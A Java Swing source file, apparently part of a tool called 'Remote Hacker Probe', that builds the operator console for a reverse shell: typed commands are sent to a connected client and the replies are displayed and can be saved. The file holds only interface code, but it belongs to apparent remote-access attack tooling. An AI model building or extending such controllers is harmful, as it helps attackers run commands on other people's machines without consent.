package rhp;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Cursor;
import java.awt.FlowLayout;

import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JFileChooser;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.border.EmptyBorder;
import javax.swing.text.DefaultCaret;
import javax.swing.JTextField;
import java.awt.Font;
import javax.swing.JTextArea;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.awt.event.ActionEvent;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.JLabel;

public class Shell extends JDialog {
	private JTextField ShellInput;
	public int ShellAccessingClientId;
	public static JTextArea ShellOutput = new JTextArea();
	JButton ShellGo;
	JLabel interact = new JLabel("");
	public Shell() {
		
		MainWindow.HaltAllSystems();
		setResizable(false);
		setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
		setTitle("Remote Hacker Probe | Reverse Shell");
		setBounds(100, 100, 633, 387);
		
		ShellInput = new JTextField();
		ShellInput.setBounds(10, 305, 540, 37);
		ShellInput.setToolTipText("Shell Input");
		ShellInput.setFont(new Font("Consolas", Font.PLAIN, 12));
		ShellInput.setColumns(10);
		ShellInput.addActionListener(new java.awt.event.ActionListener() {
		      public void actionPerformed(ActionEvent e) {
		        ShellGo.doClick();
		      }
		    });
		ShellOutput.setToolTipText("Reverse Shell Output");
		
		ShellOutput.setEditable(false);
		ShellOutput.setFont(new Font("Consolas", Font.PLAIN, 13));
		
		DefaultCaret caret = (DefaultCaret) ShellOutput.getCaret();
        caret.setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);
		JScrollPane sp_3 = new JScrollPane(ShellOutput);
		sp_3.setBounds(10, 34, 597, 260);
		sp_3.setToolTipText("Shell Output");
		sp_3.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
		sp_3.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED);
		
		ShellGo = new JButton(">");
		ShellGo.setBounds(560, 304, 52, 38);
		ShellGo.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String shellexec = ShellInput.getText().strip();
				if(shellexec.length() > 0) {
					ShellOutput.append(">> " + shellexec);
					Server.SendData(Server.Clients.get(ShellAccessingClientId), shellexec);
					ShellInput.setText("");
					ServerThread.WaitForReply();
				}	
			}
		});
		ShellGo.setToolTipText("Go");
		ShellGo.setFont(new Font("Calibri", Font.PLAIN, 16));
		ShellOutput.setBounds(10, 11, 710, 326);
		
		JPopupMenu shelloptions = new JPopupMenu();
		JMenuItem saveout = new JMenuItem("Save Output");
		saveout.setFont(new Font("Calibri", Font.PLAIN, 13));
		saveout.addActionListener(new ActionListener() {
	    	public void actionPerformed(ActionEvent e) {
	    		JFileChooser fileChooser = new JFileChooser();
	    		if (fileChooser.showSaveDialog(null) == JFileChooser.APPROVE_OPTION) {
	    		  File file = fileChooser.getSelectedFile();
	    		  FileWriter wt;
					try {
						wt = new FileWriter(file, true);
						wt.write(ShellOutput.getText());
						wt.close();
					} catch (IOException e2) {
						// TODO Auto-generated catch block
						e2.printStackTrace();
					}
	    		}
	    	}
	    });
		JMenuItem clear = new JMenuItem("Clear");
		clear.setFont(new Font("Calibri", Font.PLAIN, 13));
		clear.addActionListener(new ActionListener() {
	    	public void actionPerformed(ActionEvent e) {
	    		ShellOutput.setText("");
	    	}
	    });
		JMenuItem ChangeColor = new JMenuItem("Change Color");
		ChangeColor.setFont(new Font("Calibri", Font.PLAIN, 13));
		ChangeColor.addActionListener(new ActionListener() {
	    	public void actionPerformed(ActionEvent e) {
	    		Color randomColor = new Color((int)(Math.random() * 0x1000000));
	    		ShellOutput.setForeground(randomColor);
	    	}
	    });
		getContentPane().setLayout(null);
		shelloptions.add(saveout);
		shelloptions.add(clear);
		shelloptions.add(ChangeColor);
		MainWindow.addPopup(ShellOutput, shelloptions);
		getContentPane().add(sp_3);
		getContentPane().add(ShellInput);
		getContentPane().add(ShellGo);
		
		
		interact.setFont(new Font("Calibri", Font.PLAIN, 12));
		interact.setBounds(10, 9, 583, 14);
		
		getContentPane().add(interact);
		
		addWindowListener(new WindowAdapter() {
			@Override
		    public void windowOpened(WindowEvent we) {
		        ShellOutput.setText(""); // clear for any data that may be in
		    }
		});
		
		addWindowListener(new WindowAdapter() {
		    @Override
		    public void windowClosed(WindowEvent e) {
		        Shell.ShellOutput.setText("");
		        MainWindow.Log("Reverse Shell closed.");
		        MainWindow.EnableAllSystems();
		    }
		});
	}
}
